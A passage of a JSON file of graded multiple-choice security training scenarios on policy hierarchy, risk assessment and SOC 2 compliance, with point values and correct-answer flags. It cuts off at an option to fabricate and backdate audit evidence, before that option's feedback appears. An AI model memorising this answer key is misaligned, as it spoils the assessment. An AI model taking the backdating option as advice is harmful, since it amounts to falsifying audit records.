      "size": "Regional credit union with 150 employees, 12 branches, $500M in assets",
      "environment": "Standard financial services environment with core banking system, online banking, and member data. Regulated by NCUA.",
      "current_state": "Small security team (3 people) with informal processes. New compliance requirement driving need for documented policies."
    },
    "introduction": "You're a junior security analyst at Coastal Credit Union. Your manager has asked you to help formalize the security program by understanding and applying governance fundamentals. The credit union has operated informally, but regulatory pressure requires documented policies and clear governance. This scenario will reinforce your understanding of policy hierarchy, governance structures, and how these elements work together.",
    "learning_objectives": [
      "Understand the difference between policies, standards, procedures, and guidelines",
      "Recognize appropriate governance structures for different organization sizes",
      "Apply policy hierarchy concepts to real scenarios",
      "Identify when different document types are appropriate"
    ],
    "decision_points": [
      {
        "id": "dp1",
        "sequence": 1,
        "title": "Document Type Identification",
        "situation": "Your manager shows you four documents and asks you to identify their types:\n\n**Document A:** 'All information systems must use encryption to protect sensitive member data. Encryption protects our members' privacy and ensures regulatory compliance.'\n\n**Document B:** 'Encryption must use AES-256 for data at rest and TLS 1.3 for data in transit.'\n\n**Document C:** 'To enable encryption on the database server: 1) Open SQL Management Studio, 2) Navigate to Security settings, 3) Select Transparent Data Encryption, 4) Generate certificate, 5) Enable encryption.'\n\n**Document D:** 'When selecting encryption solutions, consider factors such as performance impact, key management complexity, and vendor support availability.'\n\nWhat type is each document?",
        "options": [
          {
            "id": "a",
            "text": "A=Standard, B=Policy, C=Guideline, D=Procedure",
            "feedback": "Incorrect. Document A states intent and direction ('must use encryption... protects privacy') - that's a policy. Document B specifies exact requirements (AES-256, TLS 1.3) - that's a standard. Review the definitions: policies state what and why; standards specify what exactly.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Policies establish direction and intent. Standards specify exact requirements.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "A=Policy, B=Standard, C=Procedure, D=Guideline",
            "feedback": "Correct! Document A is a policy (management intent, high-level direction). Document B is a standard (specific technical requirements). Document C is a procedure (step-by-step instructions). Document D is a guideline (recommendations, not mandatory).",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Policy \u00e2\u2020\u2019 Standard \u00e2\u2020\u2019 Procedure \u00e2\u2020\u2019 Guideline follows from general intent to specific optional guidance.",
            "consequences": {
              "immediate": "Correct identification enables proper document management",
              "security_impact": "Understanding hierarchy ensures appropriate document creation",
              "business_impact": "Proper governance documentation"
            }
          },
          {
            "id": "c",
            "text": "A=Policy, B=Procedure, C=Standard, D=Guideline",
            "feedback": "Close, but B and C are swapped. Document B (AES-256, TLS 1.3) specifies WHAT is required - that's a standard. Document C provides step-by-step HOW instructions - that's a procedure. Standards define requirements; procedures explain how to meet them.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Standards specify requirements (what). Procedures provide implementation steps (how).",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "A=Guideline, B=Standard, C=Procedure, D=Policy",
            "feedback": "Incorrect. Document A uses mandatory language ('must use') and establishes direction - that's a policy, not a guideline. Document D uses suggestive language ('consider factors') - that's a guideline. Guidelines are recommendations; policies are mandates.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Policies use mandatory language ('must', 'shall'). Guidelines use suggestive language ('consider', 'may').",
            "consequences": {}
          }
        ],
        "hints": [
          "Look at the language used - 'must' vs 'consider'",
          "Think about who would approve each document type"
        ]
      },
      {
        "id": "dp2",
        "sequence": 2,
        "title": "Governance Structure Basics",
        "situation": "The credit union CEO asks: 'Who should be responsible for approving our security policies? We're a small organization - do we really need a formal structure?'\n\nYour options to recommend:",
        "options": [
          {
            "id": "a",
            "text": "The IT Manager should approve all security documents since they understand the technical details",
            "feedback": "IT Manager approval is insufficient for policies. Policies represent organizational commitments, not just technical decisions. IT should implement policies but executives should approve them. This ensures policies have organizational authority and support.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Policy approval requires executive authority, not just technical expertise. IT implements but doesn't set policy.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "Even small organizations need tiered approval: Board for major policies, CEO for operational policies, managers for procedures",
            "feedback": "Correct! Governance scales to organization size but maintains proper authority levels. Board provides oversight for significant policies. CEO approves operational policies. Managers approve procedures within their areas. This creates accountability without excessive bureaucracy.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Governance should scale to organization size while maintaining appropriate authority levels for different document types.",
            "consequences": {
              "immediate": "Appropriate governance structure for organization size",
              "security_impact": "Policies have proper authority and support",
              "business_impact": "Regulatory expectations met; clear accountability"
            }
          },
          {
            "id": "c",
            "text": "Small organizations don't need formal governance; the security team can manage everything informally",
            "feedback": "Informal governance creates accountability gaps and regulatory issues. Financial institutions specifically require documented governance. 'Small' doesn't mean 'no governance' - it means 'right-sized governance.' Structure can be simple but must exist.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "All organizations need governance structure. Size affects complexity, not existence, of governance.",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "Hire a CISO to handle all security governance decisions",
            "feedback": "A CISO can lead security but doesn't replace governance structure. Even with a CISO, Board oversight, executive approval, and clear accountability are still needed. Adding a role doesn't address the governance structure question.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security leadership roles work within governance structures, not instead of them.",
            "consequences": {}
          }
        ],
        "hints": [
          "Think about who has authority to commit the organization",
          "Consider what regulators expect to see"
        ]
      },
      {
        "id": "dp3",
        "sequence": 3,
        "title": "Policy Development Scenario",
        "situation": "The credit union needs an Acceptable Use Policy (AUP). Your manager asks you to draft it. You find an AUP template online that's 25 pages long with detailed technical specifications.\n\nHow should you approach creating the policy?",
        "options": [
          {
            "id": "a",
            "text": "Use the 25-page template as-is since it's comprehensive",
            "feedback": "A 25-page policy is too detailed and likely includes standard and procedure content mixed in. Policies should be high-level and readable. Lengthy policies aren't read or followed. Extract the policy elements and put details in standards/procedures.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Effective policies are concise. Detailed requirements belong in standards and procedures.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "Create a concise policy stating acceptable use principles, with separate standards for specific requirements",
            "feedback": "Correct! The policy should establish principles (authorized use, personal use limits, prohibited activities, monitoring notice). Specific requirements (password complexity, approved software) belong in standards. This maintains proper hierarchy and creates readable documents.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Policies establish principles; standards specify requirements. Separating them makes both more effective and maintainable.",
            "consequences": {
              "immediate": "Appropriately structured documentation",
              "security_impact": "Policy is readable and more likely to be followed",
              "business_impact": "Easier to maintain; standards can update without policy changes"
            }
          },
          {
            "id": "c",
            "text": "Skip the policy and just create procedures that tell people what to do",
            "feedback": "Procedures without policy lack authority and context. Policy establishes management's intent and authority for requirements. Without policy, procedures have no foundation. Staff don't understand why they're following procedures.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Procedures implement policies. Without policy foundation, procedures lack authority and context.",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "Create a policy that covers everything so we only need one document",
            "feedback": "All-in-one documents become unwieldy and hard to maintain. When technical requirements change (new password standard), the whole 'policy' needs executive re-approval. Separation allows updates at appropriate levels without unnecessary approval cycles.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Proper hierarchy enables efficient maintenance. Technical changes shouldn't require Board approval.",
            "consequences": {}
          }
        ],
        "hints": [
          "What belongs at the policy level versus standard level?",
          "Consider who needs to approve changes to each part"
        ]
      },
      {
        "id": "dp4",
        "sequence": 4,
        "title": "Exception Management",
        "situation": "A loan officer requests an exception to the clean desk policy. They say: 'I work with paper loan documents all day. It's impossible to lock everything away every time I step away from my desk for a minute.'\n\nHow should exceptions be handled?",
        "options": [
          {
            "id": "a",
            "text": "Deny all exceptions; policies must be followed consistently",
            "feedback": "Zero-tolerance exception policies are unrealistic and create workarounds. Legitimate operational constraints sometimes require exceptions. The key is having a process to evaluate and manage exceptions appropriately, not refusing all exceptions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Exception processes are part of mature governance. Zero-tolerance creates hidden non-compliance.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "Let department managers approve exceptions for their staff",
            "feedback": "Department manager approval alone lacks security perspective. Manager might approve to make their employee happy without considering security implications. Exceptions need security review to evaluate risk and identify compensating controls.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Exception approval should include security perspective, not just operational convenience.",
            "consequences": {}
          },
          {
            "id": "c",
            "text": "Evaluate the request: if legitimate operational need exists, approve with compensating controls and documented risk acceptance",
            "feedback": "Correct! Evaluate whether the need is legitimate (operational constraint vs. convenience). If legitimate, identify compensating controls (locked office, visitor escort, document covers). Document the exception with risk acceptance by appropriate authority. Review periodically.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Effective exception management evaluates legitimacy, requires compensating controls, documents risk acceptance, and includes periodic review.",
            "consequences": {
              "immediate": "Thoughtful exception handling",
              "security_impact": "Risk managed through compensating controls",
              "business_impact": "Operations enabled while maintaining security"
            }
          },
          {
            "id": "d",
            "text": "Change the policy to allow exceptions whenever staff find it inconvenient",
            "feedback": "Changing policy for convenience undermines security. If clean desk is important (it is for financial institutions), the policy should stand. Individual circumstances are handled through exceptions, not policy changes. Policies shouldn't be weakened for convenience.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Exceptions are for individual circumstances. Policy changes should be for legitimate organizational needs, not convenience.",
            "consequences": {}
          }
        ],
        "hints": [
          "Is there a legitimate reason or just convenience?",
          "How can risk be reduced if exception is granted?"
        ]
      },
      {
        "id": "dp5",
        "sequence": 5,
        "title": "Policy Communication",
        "situation": "New policies have been approved. Your manager asks: 'How do we make sure employees actually follow these policies? Last time we sent a policy email, nobody read it.'\n\nWhat approach do you recommend?",
        "options": [
          {
            "id": "a",
            "text": "Email all policies to staff and require acknowledgment signature",
            "feedback": "Email and acknowledgment creates compliance evidence but doesn't ensure understanding or behavior change. Staff click 'acknowledge' without reading. This is necessary but not sufficient. Communication must include understanding, not just distribution.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Acknowledgment proves distribution, not understanding or compliance. Communication must drive behavior change.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "Multi-channel approach: awareness training, role-specific guidance, manager reinforcement, and practical examples",
            "feedback": "Correct! Effective policy communication uses multiple channels. Training provides understanding. Role-specific guidance makes it relevant. Manager reinforcement creates accountability. Practical examples show application. This actually changes behavior, not just creates documentation.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Policy communication should drive behavior change through multiple channels, not just prove distribution through signatures.",
            "consequences": {
              "immediate": "Comprehensive communication program",
              "security_impact": "Policies actually followed",
              "business_impact": "Compliance becomes part of culture"
            }
          },
          {
            "id": "c",
            "text": "Post policies on the intranet and tell staff they're responsible for reading them",
            "feedback": "Passive posting puts all burden on employees. Most won't seek out and read policies. Security is responsible for effective communication, not just availability. 'It's on the intranet' is not adequate communication.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Passive availability is not communication. Security must actively ensure understanding.",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "Focus on enforcement; people will learn policies when they get in trouble for violating them",
            "feedback": "Enforcement without communication is unfair and ineffective. Staff should know rules before being punished. Enforcement alone creates adversarial relationship with security. Communication comes first; enforcement supports it.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Communication must precede enforcement. Staff deserve to know expectations before being held accountable.",
            "consequences": {}
          }
        ],
        "hints": [
          "What actually changes behavior in organizations?",
          "Think about how people learn and remember information"
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 125,
    "passing_score": 75
  },
  {
    "id": "D5-REM-002",
    "title": "Risk Assessment Basics",
    "domain": 5,
    "type": "REM",
    "difficulty": "foundational",
    "time_estimate": 25,
    "role": "IT Security Specialist",
    "organization": {
      "name": "Greenfield Medical Clinic",
      "industry": "Healthcare",
      "size": "Multi-location medical practice with 75 employees, 4 clinic locations",
      "environment": "Electronic health records (EHR), medical devices, patient portal, standard office IT. HIPAA regulated.",
      "current_state": "Growing practice that needs to formalize risk management. Previously relied on IT vendor for security decisions."
    },
    "introduction": "You're an IT security specialist at Greenfield Medical Clinic. The practice administrator has asked you to help identify and assess security risks following a ransomware attack on a similar clinic nearby. This scenario will reinforce your understanding of risk assessment fundamentals including risk components, assessment methods, and risk treatment options.",
    "learning_objectives": [
      "Understand the components of risk: threats, vulnerabilities, likelihood, and impact",
      "Differentiate between qualitative and quantitative risk assessment",
      "Apply risk assessment to real scenarios",
      "Understand risk treatment options: mitigate, transfer, accept, avoid"
    ],
    "decision_points": [
      {
        "id": "dp1",
        "sequence": 1,
        "title": "Understanding Risk Components",
        "situation": "The practice administrator describes a concern: 'Our medical devices connect to the network but don't get security updates because the manufacturer says updates might affect FDA approval. I'm worried hackers could target these devices.'\n\nIdentify the risk components in this scenario:",
        "options": [
          {
            "id": "a",
            "text": "Threat: Medical devices; Vulnerability: Network connection; Impact: FDA approval issues",
            "feedback": "Incorrect assignment. Medical devices are assets, not threats. Threats are actors or events (like hackers). The vulnerability is the lack of security updates. FDA approval isn't the impact - patient harm or data breach would be impacts.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Don't confuse assets with threats. Threats are what attacks assets. Vulnerabilities are weaknesses in assets.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "Threat: Hackers/malware; Vulnerability: Unpatched medical devices; Impact: Patient data breach, device manipulation, regulatory penalties",
            "feedback": "Correct! Hackers and malware are threats (actors/events that could cause harm). Unpatched devices are the vulnerability (weakness). Patient data breach, device manipulation, and regulatory penalties are impacts (consequences). Likelihood depends on attacker interest and exposure.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Threat = who/what attacks. Vulnerability = weakness exploited. Impact = consequence if successful.",
            "consequences": {
              "immediate": "Correct risk component identification",
              "security_impact": "Enables proper risk assessment and treatment",
              "business_impact": "Can communicate risk clearly to leadership"
            }
          },
          {
            "id": "c",
            "text": "Threat: Network connection; Vulnerability: Hackers; Impact: Security updates",
            "feedback": "Components are confused. Network connection is infrastructure, not a threat. Hackers are threats, not vulnerabilities. Security updates (or lack thereof) are a vulnerability factor, not an impact. Review the definitions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Threats are external actors or events. Vulnerabilities are internal weaknesses. Impacts are consequences.",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "Threat: FDA regulations; Vulnerability: Medical device security; Impact: Hacker attacks",
            "feedback": "FDA regulations aren't threats - they're constraints. Hacker attacks aren't impacts - attacks are threat events. The impact is what happens after a successful attack (data breach, patient harm). Threats and impacts are commonly confused.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Attacks are threat events. Impacts are the consequences of successful attacks.",
            "consequences": {}
          }
        ],
        "hints": [
          "Who or what could cause harm? (That's the threat)",
          "What weakness enables the threat? (That's the vulnerability)"
        ]
      },
      {
        "id": "dp2",
        "sequence": 2,
        "title": "Qualitative vs. Quantitative Assessment",
        "situation": "The CFO asks: 'What's the actual dollar risk from a ransomware attack? I need numbers for the board presentation.'\n\nYou have limited historical data and time. How do you approach the risk assessment?",
        "options": [
          {
            "id": "a",
            "text": "Provide precise dollar figures using industry averages: 'A ransomware attack would cost exactly $287,453'",
            "feedback": "False precision is misleading. Without specific data about your environment, exact figures are guesses dressed up as analysis. Industry averages don't reflect your specific situation. This creates false confidence in unreliable numbers.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Quantitative assessments require reliable data. False precision is worse than acknowledged uncertainty.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "Use qualitative assessment (High/Medium/Low) with ranges, explaining limitations of more precise estimates",
            "feedback": "Correct! With limited data, qualitative assessment with ranges is more honest and useful. 'Impact is High - potentially $200K-$500K based on similar incidents' is more accurate than false precision. Explain why precise numbers aren't available.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Qualitative assessment is appropriate when data is limited. Ranges with explanation are better than false precision.",
            "consequences": {
              "immediate": "Honest assessment with appropriate confidence level",
              "security_impact": "Risk communicated accurately without false precision",
              "business_impact": "Board makes decisions on realistic information"
            }
          },
          {
            "id": "c",
            "text": "Refuse to provide any estimates since we don't have enough data for accurate quantification",
            "feedback": "Refusing to assess risk doesn't help decision-making. Risk assessment doesn't require perfect data. Qualitative assessment with acknowledged limitations is valuable. Leadership needs risk information even if imperfect.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Some risk information is better than none. Acknowledge limitations rather than refusing to assess.",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "Hire consultants to perform detailed quantitative analysis before making any risk statements",
            "feedback": "Detailed quantitative analysis takes time and money that may not be available. For many risks, qualitative assessment is sufficient. Quantitative analysis should be reserved for significant investment decisions where precision matters.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Quantitative analysis has a place but isn't always necessary. Match assessment method to decision needs.",
            "consequences": {}
          }
        ],
        "hints": [
          "What does the CFO actually need for decision-making?",
          "Consider the difference between precision and accuracy"
        ]
      },
      {
        "id": "dp3",
        "sequence": 3,
        "title": "Risk Treatment Options",
        "situation": "Your risk assessment identified several risks. For each, you need to recommend treatment. The practice administrator asks: 'What are our options for handling these risks?'\n\n**Risk 1:** Medical device vulnerability (High risk, can't patch)\n**Risk 2:** Earthquake damage to server room (Low likelihood, High impact)\n**Risk 3:** Employee accidentally emailing patient data (Medium risk)\n**Risk 4:** Using an unsupported legacy billing system\n\nMatch each risk with the most appropriate treatment approach.",
        "options": [
          {
            "id": "a",
            "text": "1=Accept, 2=Mitigate, 3=Transfer, 4=Avoid",
            "feedback": "Incorrect matches. Accepting high risk from medical devices without controls is inappropriate. Mitigation for earthquake is incomplete without transfer. Legacy system risk should be avoided by replacement if unsupported creates unacceptable risk.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Risk treatment should match the risk characteristics and available options.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "1=Mitigate (compensating controls), 2=Transfer (insurance) + Mitigate (backup), 3=Mitigate (training, DLP), 4=Avoid (replace system)",
            "feedback": "Correct! Medical devices: Can't patch but can segment network, monitor, and limit access (mitigate). Earthquake: Get insurance (transfer) AND maintain offsite backups (mitigate). Email risk: Training and technical controls (mitigate). Legacy system: Replace with supported system (avoid).",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Treatment options aren't exclusive. Many risks require combined approaches.",
            "consequences": {
              "immediate": "Appropriate treatment for each risk",
              "security_impact": "Risks reduced to acceptable levels",
              "business_impact": "Balanced approach to risk management"
            }
          },
          {
            "id": "c",
            "text": "1=Mitigate, 2=Accept, 3=Avoid, 4=Transfer",
            "feedback": "Several issues. Accepting earthquake risk without transfer (insurance) is poor risk management for high-impact scenarios. Avoiding email risk entirely isn't practical - you need to mitigate it. Can't transfer legacy system risk - you own it.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Accept is for risks you consciously choose to retain. High-impact risks usually need transfer or mitigation.",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "Accept all risks since small organizations can't afford extensive controls",
            "feedback": "Accepting all risks isn't risk management. Every organization can implement some controls proportionate to their resources. Even small clinics can segment networks, train staff, and purchase insurance. Acceptance should be conscious choice, not default.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Risk acceptance should be deliberate and documented, not default due to inaction.",
            "consequences": {}
          }
        ],
        "hints": [
          "Consider what's controllable and what isn't",
          "Some risks benefit from multiple treatment approaches"
        ]
      },
      {
        "id": "dp4",
        "sequence": 4,
        "title": "Risk Prioritization",
        "situation": "Your assessment identified these risks:\n\n| Risk | Likelihood | Impact | \n|------|------------|--------|\n| A: Ransomware attack | High | High |\n| B: Employee loses laptop | Medium | Medium |\n| C: Natural disaster | Low | High |\n| D: Phishing leads to credential theft | High | Medium |\n\nWith limited resources, how do you prioritize these risks?",
        "options": [
          {
            "id": "a",
            "text": "Address in order: D, B, C, A (alphabetically reversed for no particular reason)",
            "feedback": "Random or arbitrary prioritization doesn't optimize risk reduction. Risk prioritization should be systematic based on risk levels. High likelihood AND high impact risks (A) should typically be addressed first.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Risk prioritization should be systematic, not arbitrary.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "Priority order: A (High/High), D (High/Medium), B (Medium/Medium), C (Low/High) - based on risk level",
            "feedback": "Correct! Risk level combines likelihood and impact. A (High/High) is highest priority. D (High/Medium) is next because high likelihood means it's likely to occur. B and C are lower priority, though C's high impact means it shouldn't be ignored (transfer with insurance).",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Risk prioritization combines likelihood and impact. High/High risks are highest priority. High likelihood often weighs more than low likelihood/high impact.",
            "consequences": {
              "immediate": "Systematic prioritization guides resource allocation",
              "security_impact": "Highest risks addressed first",
              "business_impact": "Efficient use of limited security resources"
            }
          },
          {
            "id": "c",
            "text": "Focus only on A since it's the only High/High; ignore the others",
            "feedback": "Focusing only on the highest risk ignores other significant risks. D is also important due to high likelihood. Even lower-priority risks need attention - C should have insurance even if not highest priority. Risk management is comprehensive, not single-focus.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Risk management addresses all risks proportionately, not just the single highest risk.",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "Address C first since natural disaster would be catastrophic",
            "feedback": "High impact alone doesn't determine priority when likelihood is low. C's low likelihood means ransomware (high likelihood, high impact) is more urgent. However, C shouldn't be ignored - transfer risk through insurance while focusing mitigation effort on more likely risks.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Prioritization considers both likelihood and impact. Low likelihood reduces priority even for high-impact events.",
            "consequences": {}
          }
        ],
        "hints": [
          "How does likelihood affect prioritization?",
          "Should low-priority risks be ignored entirely?"
        ]
      },
      {
        "id": "dp5",
        "sequence": 5,
        "title": "Risk Communication",
        "situation": "You need to present your risk assessment findings to clinic leadership. The practice administrator, medical director, and CFO will attend. They have varying technical backgrounds.\n\nHow do you communicate the risk findings effectively?",
        "options": [
          {
            "id": "a",
            "text": "Present technical details: CVE numbers, CVSS scores, attack vectors, and technical controls needed",
            "feedback": "Technical details overwhelm non-technical audiences. CVE numbers and CVSS scores are meaningless to the medical director and CFO. Risk communication should translate technical findings into business terms. What does this mean for patient care, finances, and operations?",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Risk communication must be tailored to the audience. Business leaders need business impact, not technical details.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "Focus on business impact: patient safety risks, financial exposure, operational disruption, and regulatory implications",
            "feedback": "Correct! Business leaders care about patient care, money, operations, and staying out of regulatory trouble. Translate technical risks into these terms. 'Unpatched devices could allow attackers to disrupt patient care and trigger HIPAA breach notification' is more meaningful than 'CVE-2023-XXXX allows remote code execution.'",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Translate technical risk into business impact: patient safety, financial, operational, regulatory.",
            "consequences": {
              "immediate": "Leadership understands and engages with risk findings",
              "security_impact": "Better support for security investments",
              "business_impact": "Informed risk decisions by leadership"
            }
          },
          {
            "id": "c",
            "text": "Downplay risks to avoid alarming leadership; they might overreact",
            "feedback": "Downplaying risks is dishonest and dangerous. Leadership needs accurate information to make decisions. If they 'overreact' by investing in security, that may be appropriate. Your job is accurate communication, not managing their reaction.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Risk communication must be accurate. Leadership needs honest information for informed decisions.",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "Provide the risk register spreadsheet and let them draw their own conclusions",
            "feedback": "Raw data without context and interpretation isn't effective communication. Leadership expects analysis and recommendations, not just data. Your value is translating technical findings into actionable insights for business decision-makers.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Risk communication requires interpretation and context, not just raw data.",
            "consequences": {}
          }
        ],
        "hints": [
          "What do each of these leaders care about most?",
          "How do you make technical findings meaningful to non-technical audience?"
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 125,
    "passing_score": 75
  },
  {
    "id": "D5-REM-003",
    "title": "Compliance Concepts",
    "domain": 5,
    "type": "REM",
    "difficulty": "foundational",
    "time_estimate": 25,
    "role": "IT Compliance Coordinator",
    "organization": {
      "name": "Summit Software Solutions",
      "industry": "Technology / SaaS",
      "size": "Software company with 200 employees providing B2B SaaS platform",
      "environment": "Cloud-based SaaS platform serving enterprise customers. Processes customer data including some with financial and healthcare clients.",
      "current_state": "Growing company receiving more customer security questionnaires. No formal compliance program. First SOC 2 audit scheduled."
    },
    "introduction": "You're an IT compliance coordinator at Summit Software Solutions. The company is experiencing growth and customers are increasingly asking for security certifications and audit reports. Your first SOC 2 audit is approaching. This scenario will reinforce your understanding of compliance fundamentals, audit types, and how to prepare for assessments.",
    "learning_objectives": [
      "Understand different types of compliance requirements (regulatory vs. contractual)",
      "Differentiate between audit types and assessments",
      "Learn how to prepare for and respond to audits",
      "Understand the role of evidence in compliance"
    ],
    "decision_points": [
      {
        "id": "dp1",
        "sequence": 1,
        "title": "Understanding Compliance Types",
        "situation": "Your sales team has questions about customer security requirements:\n\n**Customer A (Healthcare):** 'We need to see your HIPAA compliance documentation'\n**Customer B (Financial):** 'Do you have SOC 2 Type II report?'\n**Customer C (Enterprise):** 'Please complete our 200-question security questionnaire'\n**Customer D (Government):** 'We require FedRAMP authorization'\n\nThe VP of Sales asks: 'Which of these are actual legal requirements and which are just customer requests?'",
        "options": [
          {
            "id": "a",
            "text": "All are legal requirements because customers are asking for them",
            "feedback": "Customer requests aren't automatically legal requirements. HIPAA and FedRAMP have legal/regulatory basis. SOC 2 is a voluntary attestation standard. Questionnaires are contractual, not legal requirements. Understanding the difference affects how you prioritize and approach each.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Customer requirements may be contractual or regulatory. Understanding the distinction helps prioritize compliance efforts.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "HIPAA and FedRAMP are regulatory requirements; SOC 2 and questionnaires are business/contractual requirements",
            "feedback": "Correct! HIPAA is federal law for healthcare data. FedRAMP is federal requirement for cloud services to government. SOC 2 is voluntary attestation that customers often require contractually. Questionnaires are customer-specific contractual requirements. All matter, but for different reasons.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Compliance requirements come from different sources: laws/regulations, industry standards, and customer contracts. Each type has different implications.",
            "consequences": {
              "immediate": "Clear understanding of compliance landscape",
              "security_impact": "Appropriate prioritization of compliance efforts",
              "business_impact": "Sales team can accurately communicate compliance status"
            }
          },
          {
            "id": "c",
            "text": "Only government requirements (FedRAMP) are actual compliance; others are just security requests",
            "feedback": "HIPAA is also a legal compliance requirement, not just a security request. SOC 2, while voluntary, becomes a compliance obligation when contractually required. Compliance extends beyond government requirements to include legal and contractual obligations.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Compliance includes regulatory requirements (HIPAA) and contractual obligations (SOC 2 when required by customers).",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "None are compliance requirements since we're a software company, not a regulated industry",
            "feedback": "Software companies have compliance requirements too. If you process healthcare data, HIPAA applies. If you sell to government, FedRAMP may apply. Customer contracts create compliance obligations. 'We're not regulated' is rarely true in modern business.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Compliance requirements flow from what data you process and who you serve, not just what industry you're in.",
            "consequences": {}
          }
        ],
        "hints": [
          "Consider where each requirement comes from - law, regulation, or contract",
          "What are the consequences of non-compliance for each?"
        ]
      },
      {
        "id": "dp2",
        "sequence": 2,
        "title": "Understanding Audit Types",
        "situation": "A customer asks about your SOC 2 report. You know you're getting a SOC 2 audit but aren't sure about the details. The auditor mentions 'Type I' versus 'Type II' reports.\n\nWhat's the difference, and which should you pursue?",
        "options": [
          {
            "id": "a",
            "text": "Type I is for small companies; Type II is for large enterprises",
            "feedback": "Company size doesn't determine Type I vs Type II. Type I assesses control design at a point in time. Type II assesses design AND operating effectiveness over a period. Most customers want Type II because it shows controls actually work, not just that they exist on paper.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Type I vs Type II relates to assessment scope, not company size.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "Type I is point-in-time design assessment; Type II is period-based assessment of design AND operating effectiveness",
            "feedback": "Correct! Type I says 'your controls were properly designed on this date.' Type II says 'your controls were designed properly AND operated effectively over this 6-12 month period.' Type II is more valuable because it demonstrates sustained compliance, not just a snapshot.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Type I = design at a point in time. Type II = design + operating effectiveness over a period. Type II provides more assurance.",
            "consequences": {
              "immediate": "Understand what audit will assess and customer expectations",
              "security_impact": "Type II drives sustained control operation",
              "business_impact": "Most customers want Type II; Type I may not satisfy requirements"
            }
          },
          {
            "id": "c",
            "text": "Type I covers security; Type II covers security plus availability",
            "feedback": "Type I and Type II don't differ by which trust services criteria (security, availability, etc.) are covered - both can cover any criteria you choose. The difference is assessment depth: point-in-time design vs. period-based operating effectiveness.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Trust services criteria (security, availability, etc.) are separate from Type I/II designation.",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "Type I is internal audit; Type II is external audit",
            "feedback": "Both Type I and Type II are performed by external auditors (CPAs). Internal audit is a separate function. The Type I/II distinction relates to what's assessed, not who performs it.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "SOC reports are always by external auditors. Type I/II refers to assessment scope.",
            "consequences": {}
          }
        ],
        "hints": [
          "What do customers want to know - that controls exist or that they work?",
          "Consider what 'point in time' versus 'period' means for assurance"
        ]
      },
      {
        "id": "dp3",
        "sequence": 3,
        "title": "Evidence Collection",
        "situation": "The SOC 2 auditor has sent an initial request list. Items include:\n\n- Access control policy\n- Evidence of access reviews for the period\n- Change management ticket samples\n- Security awareness training records\n- Incident response plan and incident logs\n\nYour team is scrambling because evidence is scattered or doesn't exist. How do you approach evidence management going forward?",
        "options": [
          {
            "id": "a",
            "text": "Create the missing evidence now and date it appropriately to cover the audit period",
